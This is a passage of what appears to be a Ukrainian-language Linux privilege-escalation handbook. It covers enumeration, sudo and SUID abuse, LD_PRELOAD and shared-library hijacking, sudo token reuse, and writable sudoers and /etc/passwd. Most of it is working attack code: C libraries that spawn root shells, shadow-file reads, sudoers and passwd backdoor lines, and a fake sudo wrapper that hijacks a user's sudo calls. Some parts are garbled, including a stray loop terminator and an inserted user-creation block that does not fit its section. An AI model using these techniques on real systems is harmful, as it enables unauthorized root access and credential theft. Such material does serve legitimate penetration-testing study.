D-Bus працює за **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісія сигналів тощо) на основі кумулятивного ефекту співпадаючих правил політики. Ці політики визначають взаємодії з bus і потенційно можуть дозволяти підвищення привілеїв через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, яка деталізує дозволи для користувача root на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача чи групи застосовуються універсально, тоді як політики з контекстом "default" застосовуються до всіх, хто не покритий іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як виявляти та експлуатувати D-Bus-комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво досліджувати мережу й визначати положення машини в ній.

### Загальна енумерація
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві служби, які працюють на машині та з якими ви не змогли взаємодіяти до того, як отримали доступ:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, можливо, ви зможете отримати credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна інвентаризація

Перевірте, хто ви, які у вас **привілеї**, які **користувачі** є в системі, які з них можуть **login** і які мають **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux постраждали від бага, який дозволяє користувачам із **UID > INT_MAX** підвищувати привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатувати це** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якоїсь групи**, яка може надати вам root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є щось цікаве в буфері обміну (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти як кожен користувач**, використовуючи цей пароль.

### Su Brute

Якщо вам не шкода створити багато шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати брутфорсити користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається брутфорсити користувачів.

## Зловживання записуваним $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, ви можете підняти привілеї, **створивши backdoor всередині записуваної папки** з іменем якоїсь команди, яка буде виконана іншим користувачем (бажано root), і яка **не завантажується з папки, що розташована перед** вашою записуваною папкою в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати деякі команди за допомогою sudo або вони можуть мати suid-біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачеві виконувати певні команди з привілеями іншого користувача без введення пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, і тепер тривіально отримати shell, додавши ssh key у root directory або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python library під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код як root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних шелів Bash оцінює `$BASH_ENV` і підвантажує цей файл перед запуском цільового скрипта. Багато правил sudo дозволяють запускати скрипт або оболонкову обгортку. Якщо `BASH_ENV` зберігається sudo, ваш файл буде підвантажений з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash script).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення безпеки:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте логування I/O sudo та сповіщення при використанні збережених env-змінних.

### Шляхи обходу виконання Sudo

**Перейдіть**, щоб прочитати інші файли або використати **symlinks**. Наприклад у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо **sudo permission** надається для однієї команди **без вказівки шляху**: _hacker10 ALL= (root) less_ ви можете експлуатувати це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використати, якщо **suid** binary **виконує іншу команду без вказання шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст підозрілого SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary з вказаним шляхом до команди

Якщо **suid** binary **виконує іншу команду із зазначенням шляху**, тоді можна спробувати **export a function** з назвою тієї команди, яку викликає suid файл.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_ ви маєте спробувати створити функцію та export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so файлів), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти зловживанню цією можливістю, особливо щодо виконуваних файлів **suid/sgid**, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором (_euid_).
- Для виконуваних файлів з suid/sgid предзавантажуються лише бібліотеки у стандартних шляхах, які самі мають права suid/sgid.

Ескалація привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися і бути розпізнаною навіть під час виконання команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Зберегти як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запускаючи
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо зловмисник контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, у якому будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли натрапляєте на бінарний файл з правами **SUID**, який виглядає підозріло, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб експлуатувати це, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що міститиме наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляції правами доступу до файлів і запуску shell з підвищеними привілеями.

Скомпілюйте наведений вище файл C у файл спільної бібліотеки (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має запустити exploit, що потенційно дозволить скомпрометувати систему.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з папки, у яку ми можемо записувати, створімо library у цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку на кшталт
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це курований список Unix-бінарників, які може експлуатувати атакуючий, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви **можете лише вставляти аргументи** в команду.

Проект збирає легітимні функції Unix-бінарників, які можна зловживати, щоб вийти з обмежених shell, підняти або зберегти підвищені привілеї, передавати файли, spawn bind and reverse shells та полегшити інші post-exploitation завдання.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знаходить він спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете ескалувати привілеї, **чекаючи виконання команди sudo і потім перехопивши сесійну токен**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **використовував `sudo`** для виконання чогось в **останні 15 хвилин** (за замовчуванням це тривалість sudo token, який дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно, змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете ескалувати привілеї, використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) створить бінарник `activate_sudo_token` в _/tmp_. Ви можете використати його, щоб **активувати sudo token у вашій сесії** (ви автоматично не отримаєте root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Третій exploit** (`exploit_v3.sh`) **створить sudoers file** який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у цій папці або на будь-якому з файлів, створених у ній, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell від імені цього користувача з PID 1234, ви можете **отримати привілеї sudo** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, то ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв і ви отримали shell у цьому контексті користувача, ви можете **створити новий sudo виконуваний файл**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, запускався ваш sudo виконуваний файл.

Зверніть увагу, що якщо користувач використовує інший shell (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки завантажуються конфігураційні файли**. Зазвичай цей файл містить наступний рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що конфігураційні файли з `/etc/ld.so.conf.d/*.conf` будуть прочитані. Ці конфігураційні файли **вказують на інші папки**, де будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права запису** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якому файлі всередині `/etc/ld.so.conf.d/` або будь-якій папці, вказаній у конфігураційному файлі `/etc/ld.so.conf.d/*.conf`, він може отримати підвищені привілеї.\
Перегляньте **як експлуатувати цю помилкову конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши бібліотеку в `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних root privileges**. Це фактично розбиває root **privileges на менші та відмінні одиниці**. Кожну з цих одиниць можна потім незалежно надати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорій

У директорії біт **"execute"** означає, що відповідний користувач може "**cd**" у папку.\
Біт **"read"** означає, що користувач може **list** **files**, а біт **"write"** означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють вторинний рівень дискреційних дозволів, здатний **overriding the traditional ugo/rwx permissions**. Ці дозволи підвищують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Такий рівень **granularity забезпечує точніше управління доступом**. Більше деталей можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

Надайте користувачу "kali" права читання та запису над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** з системи файли з певними ACLs:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** session іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише свого **your own user**. Однак ви можете знайти **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Захоплення сесій tmux

Це була проблема зі **старими версіями tmux**. Мені не вдалося захопити сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перегляд сеансів tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 і 13 травня 2008 року можуть бути вразливими до цієї помилки.\
Ця помилка виникає при створенні нового ssh ключа в цих ОС, оскільки **було можливим лише 32,768 варіацій**. Це означає, що всі варіанти можна обчислити і, **маючи ssh public key ви можете знайти відповідний private key**. Ви можете знайти обчислені варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH — цікаві значення конфігурації

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за public key. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо автентифікація за паролем дозволена, визначає, чи дозволяє сервер вхід у акаунти з порожнім рядком пароля. За замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh, за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти за допомогою пароля та private key
- `without-password` or `prohibit-password`: root може увійти тільки за допомогою private key
- `forced-commands-only`: root може увійти лише за допомогою private key і лише при вказаних опціях команд
- `no`: заборонено

### AuthorizedKeysFile

Визначає файли, що містять public keys, які можуть використовуватись для автентифікації користувача. Вони можуть містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказати абсолютні шляхи** (що починаються з `/`) або **шляхи відносно домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (без passphrases!) що залишаються на вашому сервері. Таким чином ви зможете **jump** via ssh **to a host** і звідти **jump to another** host, **using** the **key** розташований на вашому **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (default is allow).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете використати це для abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову shell**. Тому, якщо ви можете **записати або змінити будь-який із них ви можете escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь підозрілий profile script, слід перевірити його на **чутливі деталі**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати резервні копії. Тому рекомендовано **знайти всі** та **перевірити, чи можете їх прочитати**, щоб побачити **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або еквівалентному) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` та встановіть згенерований пароль.

```bash
# Generated password
PASSWORD='e9P$3kR8vQz7!aT'

# create user hacker with home directory and /bin/bash shell
sudo useradd -m -s /bin/bash hacker

# set the password for hacker
echo "hacker:${PASSWORD}" | sudo chpasswd

# verify
sudo id hacker
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наступні рядки для додавання фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` знаходиться за адресою `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Варто перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити такі рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Незвичні розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Файли, змінені за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
